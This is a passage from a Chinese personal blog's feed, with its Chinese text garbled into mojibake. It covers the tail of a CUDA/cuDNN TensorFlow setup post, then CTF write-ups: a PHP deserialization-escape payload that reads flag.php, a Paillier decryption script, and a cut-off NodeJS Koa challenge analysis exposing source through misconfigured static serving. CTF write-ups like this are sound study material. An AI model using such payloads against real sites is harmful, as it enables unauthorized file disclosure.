href="https://developer.nvidia.com/rdp/form/cudnn-download-survey">å®˜ç½‘</a>ä¸‹è½½ä¸ducaå¯¹åº”ç‰ˆæœ¬çš„cuDNNï¼Œä¸è¿‡é¦–å…ˆéœ€è¦æ³¨å†Œã€ç™»å½•ã€å®Œæˆä¸€ä¸ªå°è°ƒæŸ¥é—®å·ï¼Œä¹Ÿä¸å¤æ‚çš„ã€‚</p><p>ä¸‹è½½å®Œæ¯•ä¹‹åï¼Œå°†å‹ç¼©åŒ…é‡Œçš„å†…å®¹æ”¾å…¥CUDAå®‰è£…çš„ç›®å½•<code>C:\ProgramData\NVIDIA Corporation\CUDA Samples\v10.0</code>ï¼Œå¦‚å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/cudnn.png" alt=""></p><p>åŒæ—¶éœ€è¦å°†<code>cudnn64_7.dll</code>æ”¾å…¥<code>C:\Windows\System32</code>ä¸‹ï¼Œä¸ç„¶å¯èƒ½ä»ç„¶æ‰¾ä¸åˆ°è¯¥dllã€‚</p><p>æ­¤æ—¶å†å»æµ‹è¯•ï¼Œåº”è¯¥å°±æ²¡é—®é¢˜äº†ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹è¯­å¥æµ‹è¯•ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; a = tf.test.is_built_with_cuda()  # åˆ¤æ–­CUDAæ˜¯å¦å¯ä»¥ç”¨</span><br><span class="line">&gt;&gt;&gt; b = tf.test.is_gpu_available(</span><br><span class="line">...     cuda_only=False,</span><br><span class="line">...     min_cuda_compute_capability=None</span><br><span class="line">... )                                  # åˆ¤æ–­GPUæ˜¯å¦å¯ä»¥ç”¨</span><br></pre></td></tr></table></figure><p>æˆåŠŸé…ç½®çš„æ•ˆæœå¦‚ä¸‹å›¾ï¼š</p><p><img src="http://ggb0n.cool/images/test1.png" alt=""></p><p>åé¦ˆå¦‚ä¸Šä¿¡æ¯ï¼Œåˆ™è¡¨æ˜é…ç½®å·²ç»æˆåŠŸï¼Œå†æ¬¡è·‘ç®—æ³•å°±æ˜¯GPUäº†ï¼Œåˆå¿«åˆæ‹‰é£~</p><h3 id="é—®é¢˜åŠè§£å†³"><a href="#é—®é¢˜åŠè§£å†³" class="headerlink" title="é—®é¢˜åŠè§£å†³"></a>é—®é¢˜åŠè§£å†³</h3><p>åœ¨è‡ªå·±é…ç½®çš„æ—¶å€™ï¼Œè¿œè¿œæ²¡æœ‰ä¸Šé¢è¯´çš„è¿™ä¹ˆç®€å•ï¼Œèµ·åˆç›´æ¥é»˜è®¤è£…äº†<code>tensorflow</code>ï¼Œç»“æœæ˜¯æœ€æ–°ç‰ˆ<code>2.1.0</code>çš„ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œä¹Ÿå°±å®‰è£…äº†<code>cuda10.2</code>çš„ç‰ˆæœ¬ï¼Œç»“æœæŠ¥é”™æ‰¾ä¸åˆ°<code>cudart64_100.dll</code>ï¼Œå»ä¸Šé¢æä¾›çš„é“¾æ¥åº“çš„ä¸‹è½½åœ°å€æ‰¾åˆ°å®‰è£…å°±è¡Œäº†ï¼Œç„¶è€Œé—®é¢˜å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œåœ¨é…ç½®å¥½cuDNNä¹‹åï¼Œç”¨å‰é¢çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼Œä¸€ç›´æŠ¥é”™ï¼š</p><p><code>cudaGetDevice() failed. Status: cudaGetErrorString symbol not found.</code></p><p>è¿™æ˜¯ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ</p><p>ç½‘ä¸Šè¿˜æœ‰äººè¯´æ˜¯NVIDIAé©±åŠ¨ç‰ˆæœ¬çš„é—®é¢˜ï¼Œåœ¨æ§åˆ¶é¢æ¿çœ‹äº†ä¸€ä¸‹ï¼Œæˆ‘çš„æ˜¯<code>441</code>ï¼Œå·²ç»æ»¡è¶³è¦æ±‚äº†â€¦</p><p>æœ‰äººè¯´<code>tensorflow-2.1.0</code>è¦å’Œ<code>duca-10.1</code>é…åˆç€ç”¨ï¼Œç»“æœè¿˜æ˜¯å¾ˆä¸OKâ€¦åº”è¯¥æ˜¯æ–°ç‰ˆæœ¬å­˜åœ¨çš„é—®é¢˜ï¼Œæ¯•ç«Ÿè¿tensorflowç›®å‰éƒ½å¹¶æœªæ”¯æŒpython3çš„å„ä¸ªç‰ˆæœ¬â€¦</p><p>æœ€åï¼Œå§‘ä¸”ç›´æ¥å°†tensorflowæ¢æˆäº†<code>tensorflow-2.0.0</code>çš„ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯å‰é¢å®‰è£…æ­¥éª¤é‡Œè®²åˆ°çš„ï¼Œç„¶åå†é…åˆå®‰è£…<code>duca-10.0</code>è¿›è¡Œé…ç½®ï¼Œç»ˆäºæˆåŠŸè§£å†³äº†é—®é¢˜ã€‚ğŸ˜</p><p><em>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ </em></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¹‹å‰ä¸€æ®µæ—¶é—´ï¼Œä¸€ç›´åœ¨ç”¨CPUè·‘ç®—æ³•è®­ç»ƒè‡ªå·±çš„æ¨¡å‹ï¼Œä»Šå¤©çªç„¶æ„è¯†åˆ°æ˜¯æ”¯æŒGPUçš„å•Šï¼Œåˆå¿«åˆçœèµ„æºï¼Œä¸ç”¨å®ƒä¸æ˜¯å‚»å—â€¦ğŸ™„
    
    </summary>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://ggb0n.cool/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Deep Learning" scheme="http://ggb0n.cool/tags/Deep-Learning/"/>
    
      <category term="GPU calculation" scheme="http://ggb0n.cool/tags/GPU-calculation/"/>
    
  </entry>
  
  <entry>
    <title>å®‰æ’æœˆèµ›DASCTF</title>
    <link href="http://ggb0n.cool/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"/>
    <id>http://ggb0n.cool/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/</id>
    <published>2020-04-25T07:07:29.000Z</published>
    <updated>2020-05-13T03:10:14.591Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸­åˆå°±ç¡äº†ä¸€ä¼šå„¿èµ·æ¥åšé¢˜ï¼Œè¿˜è¢«å®¤å‹ç»™dissäº†â€¦ğŸ™„ï¼Œæå¾—ä¸‹åˆä¸€ç›´æææƒšæƒšâ€¦ ä¹Ÿåšäº†å‡ é“é¢˜ï¼Œç®€å•å†™ä¸‹é¢˜è§£å§ï¼Œå¸ˆå‚…ä»¬å‹¿æ¶ã€‚ã€‚ã€‚<a id="more"></a></p><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>è€ƒå¯Ÿååºåˆ—åŒ–é€ƒé€¸ï¼Œç±»ä¼¼çš„é¢˜ä¹‹å‰æœ‰å†™è¿‡ï¼š<a href="http://ggb0n.cool/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/#0CTF-2016-piapiapia">0CTF2019-piapiapia</a>ã€<a href="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/#babyPHP">æ˜¥ç§‹å…¬ç›Šèµ›</a>ï¼Œè¿™é‡Œä¸å†è¯¦ç»†è§£é‡Šã€‚</p><h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>è¿›å…¥é¢˜ç›®ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>æ ¹æ®å­—ç¬¦æ›¿æ¢çš„è§„åˆ™å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">";s:8:"</span>password<span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>payloadæ‰“è¿‡å»ä¹‹åçœ‹æºç æ‹¿åˆ°flagã€‚</p><h3 id="cry1-not-RSA"><a href="#cry1-not-RSA" class="headerlink" title="cry1-not RSA"></a>cry1-not RSA</h3><p>è¿™é¢˜è€ƒå¯ŸPaillieråŠ å¯†ç®—æ³•ï¼Œè¿™é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†æ–°çŸ¥è¯†ï¼š</p><blockquote><p>PaillieråŠ å¯†ç³»ç»Ÿï¼Œæ˜¯1999å¹´Paillierå‘æ˜çš„æ¦‚ç‡å…¬é’¥åŠ å¯†ç³»ç»Ÿã€‚åŸºäºå¤åˆå‰©ä½™ç±»çš„å›°éš¾é—®é¢˜ã€‚è¯¥åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§åŒæ€åŠ å¯†ï¼Œæ»¡è¶³åŠ æ³•å’Œæ•°ä¹˜åŒæ€ã€‚</p></blockquote><p><a href="https://blog.b3ale.cn/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">è¿™ç¯‡åšå®¢</a>æœ‰å¯¹è¯¥ç®—æ³•çš„è®²è§£ï¼Œè¿™é‡Œæˆ‘å°±ä¸è¿‡å¤šè®²è§£äº†ã€‚</p><h4 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>ç»™å‡ºæºç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">m = long2bytes(flag)</span><br><span class="line">n = p * q</span><br><span class="line">r = random.randint(<span class="number">1</span>,n)</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line">c = (pow(g,m,n*n))*pow(r,n,n*n))%n*n</span><br><span class="line">...</span><br><span class="line"><span class="comment"># n=... c=...</span></span><br></pre></td></tr></table></figure><p>emmmâ€¦ å…¶å®åšé¢˜çš„æ—¶å€™å¿˜äº†æŠŠæºç è®°ä¸‹æ¥äº†ï¼Œå°±ç®€å•é€šè¿‡è§£å¯†è„šæœ¬é€†äº†ä¸€ä¸‹ğŸ˜…</p><p>é€šè¿‡å¯†æ–‡cçš„äº§ç”Ÿæ˜æ˜¾çœ‹å‡ºæ¥æ˜¯Paillierç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œé‚£ä¹ˆ<code>n</code>åº”è¯¥æ˜¯å¯ä»¥åˆ†è§£çš„ï¼Œyafuåˆ†è§£äº†ä¸€ä¸‹ï¼Œæœç„¶å¯ä»¥ã€‚æ—¶é—´çŸ­ï¼Œè‡ªå·±æ‡’å¾—å†™äº†è§£å¯†è„šæœ¬äº†ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªè‡ªå·±åˆæ”¹äº†ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># paillier cryptosystem</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) // n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line">g = n+<span class="number">1</span></span><br><span class="line">pk = [n,g]</span><br><span class="line"><span class="comment"># pã€qç”±yafuåˆ†è§£è€Œæ¥</span></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line">sk = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">m = decipher(c, pk, sk)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>å†èµ é€ä¸€ä¸ªæ•´ä¸ªåŠ å¯†ã€è§£å¯†å®ç°çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) / n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    lmd = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#g = random.randint(1, n ** 2)</span></span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) != <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'[!] g is not good enough'</span>)</span><br><span class="line">        exit()</span><br><span class="line">    pk = [n, g]</span><br><span class="line">    sk = lmd</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encipher</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    n, g = pk</span><br><span class="line">    r = random.randint(<span class="number">1</span>, n ** <span class="number">2</span>)</span><br><span class="line">    c = gmpy2.powmod(g, m, n ** <span class="number">2</span>) * gmpy2.powmod(r, n, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    plaintext = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encipher(plaintext, pk)</span><br><span class="line">    print(<span class="string">'Ciphertext:'</span>, ciphertext)</span><br><span class="line">    plaintext = decipher(ciphertext, pk, sk)</span><br><span class="line">    print(<span class="string">'Plaintext:'</span>, plaintext)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å‡ ä¸ªmiscçš„é¢˜ï¼Œå°±ä¸å†å†™é¢˜è§£äº†ï¼Œæœ€è¿‘æœ‰ç‚¹å¿™â€¦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸­åˆå°±ç¡äº†ä¸€ä¼šå„¿èµ·æ¥åšé¢˜ï¼Œè¿˜è¢«å®¤å‹ç»™dissäº†â€¦ğŸ™„ï¼Œæå¾—ä¸‹åˆä¸€ç›´æææƒšæƒšâ€¦ ä¹Ÿåšäº†å‡ é“é¢˜ï¼Œç®€å•å†™ä¸‹é¢˜è§£å§ï¼Œå¸ˆå‚…ä»¬å‹¿æ¶ã€‚ã€‚ã€‚
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="ååºåˆ—åŒ–æ¼æ´" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="ååºåˆ—åŒ–é€ƒé€¸æ¼æ´" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="PaillieråŠ å¯†" scheme="http://ggb0n.cool/tags/Paillier%E5%8A%A0%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>è™ç¬¦CTFä¸¤é“webå­¦ä¹ JS</title>
    <link href="http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/04/21/%E8%99%8E%E7%AC%A6CTF%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-21T11:50:00.000Z</published>
    <updated>2020-05-13T03:10:41.467Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡çš„è™ç¬¦CTFæ²¡æŠ¥ä¸Šåä¹Ÿæ˜¯å¯æƒœï¼Œä¸è¿‡æœ‹å‹å‘æ¥é¢˜ç›®é“¾æ¥ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯JSçš„é¢˜ï¼Œè¿˜å¥½æ²¡æŠ¥åâ€¦ğŸ˜ JSå’±å•¥ä¹Ÿä¸ä¼šå‘€ï¼Œä¸è¿‡å­¦ä¹ è¿˜æ˜¯è¦å­¦ä¹ çš„ã€‚<a id="more"></a></p><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>è€ƒå¯Ÿ<code>NodeJSä»£ç å®¡è®¡</code>ã€<code>JSå¼±ç±»å‹</code>ã€<code>JWTä¼ªé€ </code></p><h4 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h4><p>ç”±äºå°šæœªä¸“é—¨å­¦ä¹ JSï¼Œæœ€è¿‘çœ‹åˆ°èµ›é¢˜å°±å‘æ€µï¼Œå› ä¸ºæœ€è¿‘çš„æ¯”èµ›JSçš„é¢˜çœŸæ˜¯è¶Šæ¥è¶Šå¤šäº†ğŸ˜‘ï¼Œè¡¥å……ä¸€äº›æœ¬é¢˜æ¶‰åŠçš„çŸ¥è¯†ç‚¹å…ˆï¼š</p><ul><li><p>1ã€NodeJSçš„æ¡†æ¶ç›®å½•ç»“æ„</p><blockquote><ul><li>dispatch.js ä¸»è¿›ç¨‹æ–‡ä»¶</li><li>worker.js å·¥ä½œè¿›ç¨‹</li><li>app.js åº”ç”¨</li><li>routes.js urlè·¯ç”±è¡¨</li><li>package.json ä¾èµ–æ¨¡å—</li><li>config.js or config/ é…ç½®æ–‡ä»¶</li><li>controllers/ ä¸šåŠ¡é€»è¾‘ç›¸å…³</li><li>views/ è¯•å›¾æ¨¡æ¿</li><li>common/ è·Ÿä¸šåŠ¡ç›¸å…³çš„å…¬å…±æ¨¡å—</li><li>proxy/ æ•°æ®è®¿é—®ä»£ç†å±‚</li><li>lib/ è·Ÿä¸šåŠ¡æ— å…³çš„å…¬å…±æ¨¡å—</li><li>assets/ images|scripts|styles</li><li>bin/ ç›¸å…³è¿è¡Œè„šæœ¬</li><li>node_moudules/</li></ul></blockquote><p>ä¸€èˆ¬NodeJSçš„é¡¹ç›®ï¼Œè®¿é—®<code>app.js</code>å³å¯è®¿é—®ä¸»æ–‡ä»¶çš„ä»£ç ï¼Œè€Œä¸»è¦çš„é€»è¾‘ä»£ç åœ¨<code>controllers/api.js</code>ä¸­ã€‚</p></li><li><p>2ã€JSå¼±ç±»å‹</p><p><code>å¼±ç±»å‹</code>å³æŒ‡ï¼šæ•°æ®ç±»å‹å¯ä»¥è¢«å¿½ç•¥, ä¸€ä¸ªå˜é‡å¯ä»¥èµ‹ä¸åŒæ•°æ®ç±»å‹çš„å€¼ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒç±»å‹çš„å˜é‡ä¹‹é—´è¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚ç©ºæ•°ç»„<code>[]</code>ä¸æ•´æ•°<code>1</code>åšæ¯”è¾ƒï¼Œè¿”å›ä¸º<code>true</code>ï¼›å°†æµ®ç‚¹å‹æ•°ä½œä¸ºæ•°ç»„çš„ç´¢å¼•ç­‰ç­‰ã€‚</p></li></ul><p>é¢å¯¹è¿™ä¸ªå¤§æ½®æµï¼ŒJSè¿˜æ˜¯è¦èµ¶ç´§å­¦å­¦å•Šâ€¦</p><h4 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>è¿›å…¥é¢˜ç›®ä¹‹åæ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œæ²¡æœ‰å…¶ä»–æŒ‰é’®ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°<code>/static/js/app.js</code>çš„å­˜åœ¨ï¼Œè®¿é—®ä¹‹åçœ‹åˆ°æç¤ºï¼š<code>æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ï¼Œè·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</code>ï¼Œæç¤º<code>static</code>æ˜¯ç›´æ¥æ˜ å°„åˆ°ç¨‹åºæ ¹ç›®å½•çš„ï¼Œé‚£ä¹ˆåº”è¯¥å¯ä»¥ç›´æ¥åœ¨æ ¹ç›®å½•ä¸‹è¿›è¡Œä»»æ„æ–‡ä»¶çš„è®¿é—®ï¼Œè®¿é—®ä¸€ä¸‹NodeJSçš„åº”ç”¨æ–‡ä»¶<code>app.js</code>è¯•è¯•ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span 